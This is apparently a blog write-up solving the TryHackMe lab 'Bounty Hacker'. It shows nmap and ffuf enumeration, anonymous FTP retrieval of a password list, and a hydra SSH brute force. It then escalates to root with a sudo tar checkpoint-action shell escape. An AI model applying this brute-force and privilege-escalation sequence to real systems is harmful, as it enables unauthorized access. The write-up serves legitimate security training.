---
title: TryHackMe - Bounty Hacker                    # Add title of the machine here
date: 2022-07-10 08:00:00 -0600                           # Change the date to match completion date
categories: TryHackMe                    # Change Templates to Writeup
tags: [thm, writeup, brute-force, privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
toc: true
image:
  path: /assets/images/thm/Bounty-Hacker/BountyHacker.jpeg
--- 

# Info

| Name         | Bounty Hacker                            |
| ------------ | ---------------------------------------- |
| Room link    | https://tryhackme.com/room/cowboyhacker  |
| Difficulty   | Easy                                     |
| Created by   | [Sevuhl](https://tryhackme.com/p/Sevuhl) |
| solving date | July 10th 2022                           |

***


# Enumeration 

## nmap scan 

```bash
nmap -Pn -sC -sV $target 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-10 10:43 EET
Nmap scan report for 10.10.164.195
Host is up (0.077s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.90.96
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.97 seconds

```

## Discovering the web server 

![Web page](/assets/images/thm/Bounty-Hacker/web-page.png)

* Fuzzing the website

```bash
ffuf -u http://$target/FUZZ -w /usr/share/wordlists/dirb/common.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.164.195/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 969, Words: 135, Lines: 31, Duration: 73ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 75ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 77ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 76ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 73ms]
index.html              [Status: 200, Size: 969, Words: 135, Lines: 31, Duration: 74ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 77ms]
:: Progress: [4614/4614] :: Job [1/1] :: 531 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

## Discovering FTP 

```bash
 ftp $target
Connected to 10.10.164.195.
220 (vsFTPd 3.0.3)
Name (10.10.164.195:juba): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive 
Passive mode: off; fallback to active mode: off.
ftp> prompt off
Interactive mode off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> mget * 
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************************************************************************************************************************************************************************|   418        7.81 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (5.54 KiB/s)
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************************************************************************************************************************************************************************|    68        1.54 MiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.89 KiB/s)
ftp> bye
221 Goodbye.
```

* locks.txt

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

* tasks.txt

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

##s## Who wrote the task list?

```
lin
```

## What service can you bruteforce with the text file found?

```
ssh
```

## Brute-forcing ssh using locks.txt wordlist 

```bash
hydra -l lin -P locks.txt ssh://$target
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 10:53:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.164.195:22/
[22][ssh] host: 10.10.164.195   login: lin   password: ******************
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 10:53:38
```

## What is the users password?

```
******************
```

# Gaining Access 

```bash
ssh lin@$target
lin@10.10.164.195's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jul 10 03:28:26 2022 from 10.8.90.96
```

## user.txt flag 

```bash
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{***************}
lin@bountyhacker:~/Desktop$ 
```

# Privilege Escalation 

## list user's privileges 

```bash
lin@bountyhacker:~$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~$ 
```

[GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo)

```bash
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

## Priv Esc 

```bash
lin@bountyhacker:~$  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
#     
# cd /root
# ls
root.txt
# cat root.txt
THM{*************}
# 
```

